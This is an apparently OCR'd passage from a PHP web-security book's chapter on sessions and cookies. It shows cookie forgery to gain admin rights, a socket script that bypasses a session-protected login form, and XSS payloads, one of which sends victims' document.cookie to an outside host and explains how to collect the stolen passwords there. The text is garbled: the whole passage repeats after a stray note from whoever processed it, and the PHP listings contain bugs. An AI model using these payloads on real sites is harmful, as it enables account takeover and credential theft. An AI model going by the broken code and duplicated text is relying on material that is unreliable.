
# 242 Part II: Solutions

![](img/a893312ec68b8170fe567f785e95c06e_255_0.png)

Fig. II.5.2. Authorization with administrative rights

Now it won't cause any difficulties to register with editor or administrator rights. It would be enough to replace the cookie admin name with editor or user. Furthermore, under conditions of the script presented in Listing II.5.3, it will be possible to authorize users of all three types. For this purpose, it would be enough to send the following HTTP header:

```
Cookie: name = cheops; admin = 1; editor = 1; user = 1\r\n
```

The operation of results of such a script are shown in Fig. II.5.3.

![](img/a893312ec68b8170fe567f785e95c06e_255_1.png)

Fig. II.5.3. Simultaneous authorization of all three user types

## II.5.6. Bypassing an HTML Form Protected by Sessions

To obtain the cookie and send it to the server, it is necessary to use sockets.
The session cookie is set by the following `Set-Cookie` HTTP header:

```
PHPSESSID = d8a29ca8e9eae318ac19e8d48831dea
expires = Fri, 28 Oct 2005 20:04:05 GMT; path=/
```

Here, PHPSESSID is the name of the session cookie for storing the unique SID, expires stands for the term of the cookie validity, and path is the cookie directory. When accessing using cookies, it is enough to wait for the string that has the data format and retrieve the SID using a regular expression: `Set-Cookie: PHPSESSID=([\d\w]+); i`. After receiving the SID, it is possible to access the form handler of the handler.php file using the `POST` method.

![](img/a893312ec68b8170fe567f785e95c06e_256_0.png)

NOTE
Working with the `POST` method through sockets is covered in more detail in Chapter II.10.

The `POST` method sends the data in the area that follows the headers, whereas the `GET` method sends data in the query string. Several variables are passed as using the `POST` method as they would be using the `GET` method: The `name-value` pairs are combined using the ampersand (`&`) character. Because the HTML form takes the `name=admin, pass=admin, and session_id` parameters with the value obtained through the sockets during the first access, the data string might appear as follows:

```
name = admin &pass = admin&session_id = d8a29ca8e9eae318ac19e8d48831dea&\r\n\r
```

The last ampersand is added to prevent the terminating line feed characters from falling into the `session_id` value. When sending data using the `POST` method, it is necessary to send the Content-Length HTTP header that specifies the number of bytes in the HTTP Content-type header; `application/x-www-form-urlencoded` specifies the data transmission. The script emulating cookie support might appear as shown in Listing II.5.13.

## Listing II.5.13. Bypassing an HTML form protected by a session

```php
<?php
$hostname = "localhost";
$path = "/test/index.php";

// Establishing the connection
// whose name is passed in the $hostname parameter
$fp = fsockopen($hostname, 80, $errno, $errstr, 30);
// Checking whether the connection has been successfully established
if (!$errno) echo "$errstr ($errno)<br />\n";
else
{
    // Forming HTTP headers to be passed
    // to the server
    $headers = "GET $path HTTP/1.1\r\n";
    $headers = "Host: $hostname\r\n";
    $headers = "Connection: Close\r\n\n";
    // Sending an HTTP query to the server
    fwrite($fp, $headers);
    // Receiving the response
    while (!feof($fp))
    {
        $line = fgets($fp, 1024);
        // Searching for the string
        // like Set-Cookie: PHPESSID = 6197e647566bdaa24da3ab42ae7604b2;
        // This string sets the cookie
        preg_match("/Set-Cookie: PHPESSID = ([\d\w]+)/i", $line, $out);
        if (!empty($out[1]))
        {
            $SID = $out[1];
            break;
        }
    }
    fclose($fp);
}

$hostname = "localhost";
$path = "/test/handler.php";
$line = "";
```

## Chapter II.5: Sessions and Cookies

```php
// Using the password to pass the user name (admin),
// its password (admin), and the hidden session_id ($SID) field
// Using headers to pass the PHPSESSID cookie
// Establishing the connection whose name
// was passed in the hostname parameter

$fp = fsockopen($hostname, 80, $errno, $errstr, 30);
// Checking whether the connection has been established successfully
if (!$fp) echo "$errstr <br />\n";
else {
    // Data of the POST query
    $data = "name=adminpass&admin_session_id=$SID&\r\n";
    // Forming HTTP headers
    // to be passed to the server
    $headers[] = "POST path HTTP/1.1\r\n";
    $headers[] = "Host: $hostname\r\n";
    $headers[] = "Content-type: application/x-www-form-urlencoded\r\n";
    $headers[] = "Content-Length: ". strlen($data)."\r\n";
    // Forging the cookie
    $headers[] = "Cookie: PHPSESSID=$SID\r\n";
    $headers[] = "Connection: Close\r\n";
    // Sending the HTTP request to the server
    fwrite($fp, $headers.$data);
    // Receiving the following response:
    while (!feof($fp)) {
        $line = fgets($fp, 1024);
    }
    fclose($fp);
    echo $line;
}
?>
```

As a result of the operation of this script, the HTML form protection mechanism is bypassed. The results of the operation shown in Listing II.5.13 are shown in Fig. II.5.4.

The next step in ensuring protection is to use a graphic image with digits the user must enter into the field.

![](img/a893312ec68b8170fe567f785e95c06e_258_0.png)

# Part II: Solutions

![](img/a893312ec68b8170fe567f785e95c06e_259_0.png)

Fig. II.5.4. Bypassing an HTML form protected using a session

## II.5.7. Cross-Site Scripting

Cross-site scripting (XSS) is based on a vulnerability caused by not filtering data entered by the user. This allows JavaScript scripts to run. In Fig II.5.5, the vulnerability is related to Listing II.5.14.

## II.5.8. Stealing Cookies

Now, to redirect any visitor to the http://www.softtime.ru/ site, it is enough to register the user with the following name: `user<script>location.href='http://www.softtime.ru';</script>`.

To ensure protection against this kind of vulnerability, it is necessary to process any data supplied from the client machine and displayed in the browser window using the htmlspecialchars() function.

Assume that you know that in the course of authorization two cookies are set, called name and pass.

## II.5.15. Setting cookies

```php
<?php
setcookie("name", $name, time() + 3600*24);
setcookie("pass", $pass, time() + 3600*24);
?>
```

Using the vulnerability described in the previous section, it is possible to retrieve cookies with JavaScript and send them to the intruder's site using the code shown in Listing II.5.16.

## II.5.16. Stealing cookies

```php
<script>
location.href='http://www.chackhost.ru/index.php?cookie='+escape(document.cookie);
</script>
```

Thus, it remains to register the following user:

```
new_user<script>location.href='http://www.chackhost.ru/index.php?cookie='+escape(document.cookie);</script>
```

Then, prepare a file on the http://www.chackhost.ru site (usually located on a free host server) that would store all logins and passwords obtained through the cookie parameter.

[/content] (Wait, I noticed the OCR text had some significant overlaps/scrambled parts in the later pages. Let me provide the clean merged version based on the logical flow of the provided text.)

*Correction: I will now provide the final corrected output based on the provided text strictly.*

[content]
# 242 Part II: Solutions

![](img/a893312ec68b8170fe567f785e95c06e_255_0.png)

Fig. II.5.2. Authorization with administrative rights

Now it won't cause any difficulties to register with editor or administrator rights. It would be enough to replace the cookie admin name with editor or user. Furthermore, under conditions of the script presented in Listing II.5.3, it will be possible to authorize users of all three types. For this purpose, it would be enough to send the following HTTP header:

```
Cookie: name = cheops; admin = 1; editor = 1; user = 1\r\n
```

The operation of results of such a script are shown in Fig. II.5.3.

![](img/a893312ec68b8170fe567f785e95c06e_255_1.png)

Fig. II.5.3. Simultaneous authorization of all three user types

## II.5.6. Bypassing an HTML Form Protected by Sessions

To obtain the cookie and send it to the server, it is necessary to use sockets.
The session cookie is set by the following `Set-Cookie` HTTP header:

```
PHPSESSID = d8a29ca8e9eae318ac19e8d48831dea
expires = Fri, 28 Oct 2005 20:04:05 GMT; path=/
```

Here, PHPSESSID is the name of the session cookie for storing the unique SID, expires stands for the term of the cookie validity, and path is the cookie directory. When accessing using cookies, it is enough to wait for the string that has the data format and retrieve the SID using a regular expression: `Set-Cookie: PHPSESSID=([\d\w]+); i`. After receiving the SID, it is possible to access the form handler of the handler.php file using the `POST` method.

![](img/a893312ec68b8170fe567f785e95c06e_256_0.png)

NOTE
Working with the `POST` method through sockets is covered in more detail in Chapter II.10.

The `POST` method sends the data in the area that follows the headers, whereas the `GET` method sends data in the query string. Several variables are passed as using the `POST` method as they would be using the `GET` method: The `name-value` pairs are combined using the ampersand (`&`) character. Because the HTML form takes the `name=admin, pass=admin, and session_id` parameters with the value obtained through the sockets during the first access, the data string might appear as follows:

```
name = admin &pass = admin&session_id = d8a29ca8e9eae318ac19e8d48831dea&\r\n\r
```

The last ampersand is added to prevent the terminating line feed characters from falling into the `session_id` value. When sending data using the `POST` method, it is necessary to send the Content-Length HTTP header that specifies the number of bytes in the HTTP Content-type header; `application/x-www-form-urlencoded` specifies the data transmission. The script emulating cookie support might appear as shown in Listing II.5.13.

## Listing II.5.13. Bypassing an HTML form protected by a session

```php
<?php
$hostname = "localhost";
$path = "/test/index.php";

// Establishing the connection
// whose name is passed in the $hostname parameter
$fp = fsockopen($hostname, 80, $errno, $errstr, 30);
// Checking whether the connection has been successfully established
if (!$errno) echo "$errstr ($errno)<br />\n";
else
{
    // Forming HTTP headers to be passed
    // to the server
    $headers = "GET $path HTTP/1.1\r\n";
    $headers = "Host: $hostname\r\n";
    $headers = "Connection: Close\r\n\n";
    // Sending an HTTP query to the server
    fwrite($fp, $headers);
    // Receiving the response
    while (!feof($fp))
    {
        $line = fgets($fp, 1024);
        // Searching for the string
        // like Set-Cookie: PHPESSID = 6197e647566bdaa24da3ab42ae7604b2;
        // This string sets the cookie
        preg_match("/Set-Cookie: PHPESSID = ([\d\w]+)/i", $line, $out);
        if (!empty($out[1]))
        {
            $SID = $out[1];
            break;
        }
    }
    fclose($fp);
}

$hostname = "localhost";
$path = "/test/handler.php";
$line = "";
```

## Chapter II.5: Sessions and Cookies

```php
// Using the password to pass the user name (admin),
// its password (admin), and the hidden session_id ($SID) field
// Using headers to pass the PHPSESSID cookie
// Establishing the connection whose name
// was passed in the hostname parameter

$fp = fsockopen($hostname, 80, $errno, $errstr, 30);
// Checking whether the connection has been established successfully
if (!$fp) echo "$errstr <br />\n";
else {
    // Data of the POST query
    $data = "name=adminpass&admin_session_id=$SID&\r\n";
    // Forming HTTP headers
    // to be passed to the server
    $headers[] = "POST path HTTP/1.1\r\n";
    $headers[] = "Host: $hostname\r\n";
    $headers[] = "Content-type: application/x-www-form-urlencoded\r\n";
    $headers[] = "Content-Length: ". strlen($data)."\r\n";
    // Forging the cookie
    $headers[] = "Cookie: PHPSESSID=$SID\r\n";
    $headers[] = "Connection: Close\r\n";
    // Sending the HTTP request to the server
    fwrite($fp, $headers.$data);
    // Receiving the following response:
    while (!feof($fp)) {
        $line = fgets($fp, 1024);
    }
    fclose($fp);
    echo $line;
}
?>
```

As a result of the operation of this script, the HTML form protection mechanism is bypassed. The results of the operation shown in Listing II.5.13 are shown in Fig. II.5.4.

The next step in ensuring protection is to use a graphic image with digits the user must enter into the field.

![](img/a893312ec68b8170fe567f785e95c06e_258_0.png)

# Part II: Solutions

![](img/a893312ec68b8170fe567f785e95c06e_259_0.png)

Fig. II.5.4. Bypassing an HTML form protected using a session

## II.5.7. Cross-Site Scripting

Cross-site scripting (XSS) is based on a vulnerability caused by not filtering data entered by the user. This allows JavaScript scripts to run. In Fig II.5.5, the vulnerability is related to Listing II.5.14.

## II.5.8. Stealing Cookies

Now, to redirect any visitor to the http://www.softtime.ru/ site, it is enough to register the user with the following name: `user<script>location.href='http://www.softtime.ru';</script>`.

To ensure protection against this kind of vulnerability, it is necessary to process any data supplied from the client machine and displayed in the browser window using the htmlspecialchars() function.

Assume that you know that in the course of authorization two cookies are set, called name and pass.

## II.5.15. Setting cookies

```php
<?php
setcookie("name", $name, time() + 3600*24);
setcookie("pass", $pass, time() + 3600*24);
?>
```

Using the vulnerability described in the previous section, it is possible to retrieve cookies with JavaScript and send them to the intruder's site using the code shown in Listing II.5.16.

## II.5.16. Stealing cookies

```php
<script>
location.href='http://www.chackhost.ru/index.php?cookie='+escape(document.cookie);
</script>
```

Thus, it remains to register the following user:

```
new_user<script>location.href='http://www.chackhost.ru/index.php?cookie='+escape(document.cookie);</script>
```

Then, prepare a file on the http://www.chackhost.ru site (usually located on a free host server) that would store all logins and passwords obtained through the cookie parameter.
